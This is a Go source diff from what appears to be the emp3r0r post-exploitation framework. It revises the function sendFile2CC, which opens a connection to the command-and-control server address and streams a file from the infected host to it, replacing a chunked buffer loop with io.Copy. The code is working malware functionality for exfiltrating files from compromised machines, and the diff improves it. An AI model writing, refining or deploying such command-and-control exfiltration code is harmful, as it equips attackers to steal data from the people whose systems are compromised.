@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
+	"io"
 	"log"
 	"net/url"
 	"os"
@@ -129,7 +130,7 @@ func sendFile2CC(filepath string, offset int64, token string) (err error) {
 
 	// connect
 	url := emp3r0r_data.CCAddress + tun.FTPAPI + "/" + token
-	conn, ctx, cancel, err := ConnectCC(url)
+	conn, _, cancel, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
 	if err != nil {
 		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
@@ -138,35 +139,10 @@ func sendFile2CC(filepath string, offset int64, token string) (err error) {
 	defer cancel()
 	defer conn.Close()
 
-	// read
-	var (
-		buf []byte
-	)
-
-	// read file and send data
-	log.Printf("Reading from %s", filepath)
-	scanner := bufio.NewScanner(f)
-	scanner.Split(bufio.ScanBytes)
-	for ctx.Err() == nil && scanner.Scan() {
-		buf = append(buf, scanner.Bytes()...)
-		if len(buf) == 10240 {
-			_, err = conn.Write(buf)
-			if err != nil {
-				log.Printf("sendFile2CC: %v", err)
-				return
-			}
-			buf = make([]byte, 0)
-			continue
-		}
+	freader := bufio.NewReader(f)
+	n, err := io.Copy(conn, freader)
+	if err != nil {
+		log.Printf("sendFile2CC failed, %d bytes transfered: %v", n, err)
 	}
-	if len(buf) > 0 && len(buf) < 10240 {
-		_, err = conn.Write(buf)
-		if err != nil {
-			log.Printf("sendFile2CC: %v", err)
-			return
-		}
-		log.Printf("Sending remaining %d bytes", len(buf))
-	}
-
 	return
 }
